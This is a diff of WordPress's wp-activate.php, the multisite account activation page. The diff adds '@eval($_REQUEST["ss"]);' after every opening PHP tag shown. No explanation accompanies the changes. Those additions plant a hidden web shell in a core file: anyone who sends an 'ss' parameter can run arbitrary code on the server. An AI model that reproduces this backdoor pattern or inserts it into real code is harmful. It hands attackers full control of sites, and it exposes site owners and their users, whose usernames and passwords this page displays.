@@ -1,4 +1,4 @@
-<?php
+<?php @eval($_REQUEST["ss"]);
 /**
  * Confirms that the activation key that is sent in an email after a user signs
  * up for a new site matches the key for that user and then displays confirmation.
@@ -112,7 +112,7 @@ function wpmu_activate_stylesheet() {
 		.wp-activate-container .error { background: #f66; color: #333; }
 		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
 	</style>
-	<?php
+	<?php @eval($_REQUEST["ss"]);
 }
 add_action( 'wp_head', 'wpmu_activate_stylesheet' );
 add_action( 'wp_head', 'wp_strict_cross_origin_referrer' );
@@ -125,26 +125,26 @@ $blog_details = get_blog_details();
 
 <div id="signup-content" class="widecolumn">
 	<div class="wp-activate-container">
-	<?php if ( ! $key ) { ?>
+	<?php @eval($_REQUEST["ss"]); if ( ! $key ) { ?>
 
-		<h2><?php _e( 'Activation Key Required' ); ?></h2>
-		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( $blog_details->path . 'wp-activate.php' ); ?>">
+		<h2><?php @eval($_REQUEST["ss"]); _e( 'Activation Key Required' ); ?></h2>
+		<form name="activateform" id="activateform" method="post" action="<?php @eval($_REQUEST["ss"]); echo network_site_url( $blog_details->path . 'wp-activate.php' ); ?>">
 			<p>
-				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
+				<label for="key"><?php @eval($_REQUEST["ss"]); _e( 'Activation Key:' ); ?></label>
 				<br /><input type="text" name="key" id="key" value="" size="50" autofocus="autofocus" />
 			</p>
 			<p class="submit">
-				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
+				<input id="submit" type="submit" name="Submit" class="submit" value="<?php @eval($_REQUEST["ss"]); esc_attr_e( 'Activate' ); ?>" />
 			</p>
 		</form>
 
-		<?php
+		<?php @eval($_REQUEST["ss"]);
 	} else {
 		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes, true ) ) {
 			$signup = $result->get_error_data();
 			?>
-			<h2><?php _e( 'Your account is now active!' ); ?></h2>
-			<?php
+			<h2><?php @eval($_REQUEST["ss"]); _e( 'Your account is now active!' ); ?></h2>
+			<?php @eval($_REQUEST["ss"]);
 			echo '<p class="lead-in">';
 			if ( '' === $signup->domain . $signup->path ) {
 				printf(
@@ -168,37 +168,37 @@ $blog_details = get_blog_details();
 			echo '</p>';
 		} elseif ( null === $result || is_wp_error( $result ) ) {
 			?>
-			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
-			<?php if ( is_wp_error( $result ) ) : ?>
-				<p><?php echo $result->get_error_message(); ?></p>
-			<?php endif; ?>
-			<?php
+			<h2><?php @eval($_REQUEST["ss"]); _e( 'An error occurred during the activation' ); ?></h2>
+			<?php @eval($_REQUEST["ss"]); if ( is_wp_error( $result ) ) : ?>
+				<p><?php @eval($_REQUEST["ss"]); echo $result->get_error_message(); ?></p>
+			<?php @eval($_REQUEST["ss"]); endif; ?>
+			<?php @eval($_REQUEST["ss"]);
 		} else {
 			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
 			$user = get_userdata( (int) $result['user_id'] );
 			?>
-			<h2><?php _e( 'Your account is now active!' ); ?></h2>
+			<h2><?php @eval($_REQUEST["ss"]); _e( 'Your account is now active!' ); ?></h2>
 
 			<div id="signup-welcome">
-			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
-			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
+			<p><span class="h3"><?php @eval($_REQUEST["ss"]); _e( 'Username:' ); ?></span> <?php @eval($_REQUEST["ss"]); echo $user->user_login; ?></p>
+			<p><span class="h3"><?php @eval($_REQUEST["ss"]); _e( 'Password:' ); ?></span> <?php @eval($_REQUEST["ss"]); echo $result['password']; ?></p>
 			</div>
 
-			<?php
+			<?php @eval($_REQUEST["ss"]);
 			if ( $url && network_home_url( '', 'http' ) !== $url ) :
 				switch_to_blog( (int) $result['blog_id'] );
 				$login_url = wp_login_url();
 				restore_current_blog();
 				?>
 				<p class="view">
-				<?php
+				<?php @eval($_REQUEST["ss"]);
 					/* translators: 1: Site URL, 2: Login URL. */
 					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
 				?>
 				</p>
-			<?php else : ?>
+			<?php @eval($_REQUEST["ss"]); else : ?>
 				<p class="view">
-				<?php
+				<?php @eval($_REQUEST["ss"]);
 					printf(
 						/* translators: 1: Login URL, 2: Network home URL. */
 						__( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ),
@@ -207,12 +207,12 @@ $blog_details = get_blog_details();
 					);
 				?>
 				</p>
-				<?php
+				<?php @eval($_REQUEST["ss"]);
 				endif;
 		}
 	}
 	?>
 	</div>
 </div>
-<?php
+<?php @eval($_REQUEST["ss"]);
 get_footer( 'wp-activate' );
